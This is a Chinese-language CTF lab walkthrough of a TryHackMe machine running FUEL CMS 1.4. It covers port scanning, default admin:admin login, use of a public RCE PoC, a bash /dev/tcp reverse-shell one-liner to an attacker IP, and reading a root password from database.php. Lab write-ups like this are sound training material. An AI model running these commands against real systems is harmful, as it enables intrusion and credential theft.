![image-20250528154906415](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528154906415.png)

我们首先根据ip进行端口扫描

![image-20250528155706768](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528155706768.png)

最开始简单的使用了fscan进行端口扫描。发现只开放了80端口，我是不敢想象的，怀疑端口扫描的不准确，又开始用nmap进行端口探测

推荐使用官方的kali进行扫描：https://tryhackme.com/room/kali

通过nmap的扫描的确发现没有端口

```
┌──(root㉿kali)-[~]
└─# nmap 10.10.96.*** -sS -sV -A -T4 -p-
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```

我们看到了robots.txt文件

![image-20250528161821006](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528161821006.png)

根据dirsearch扫描出的结果，我们去看一下具体的情况

![image-20250528161802536](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528161802536.png)

我们结合一下收集的信息

```
Apache httpd 2.4.18 ((Ubuntu))
FUEL CMS 1.4
目录：fuel
php
```

我们直接去访问fuel，发现跳转到一个登录页面

准备随便测一下弱口令的，没想到直接进去了......admin：admin

![image-20250528162111668](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528162111668.png)

随便看了一看，没什么东西，似乎有文件上传的地点，但是似乎要传指定的变量

进而直接上网去找对应的poc

![image-20250528162627369](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528162627369.png)

看到有很多1.4版本的代码执行，我们直接去试试。

![image-20250528163618885](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528163618885.png)

修改一下参数，发现成功执行了。

```
bash -c "exec bash -i >& /dev/tcp/10.8.137.162/4444 0>&1"
```

我们使用下面的命令进行反弹shell

![image-20250528164349255](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528164349255.png)

发现当前是www—data用户

![image-20250528165137605](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528165137605.png)

我们在一个文件中发现了root密码，使用linpeas也可以发现这个。

/var/www/html/fuel/application/config中的database.php

![image-20250528165500386](E:\Tryhackme_Wp\CTF-Easy\assets\image-20250528165500386.png)

这样我们就可以读取到密码了。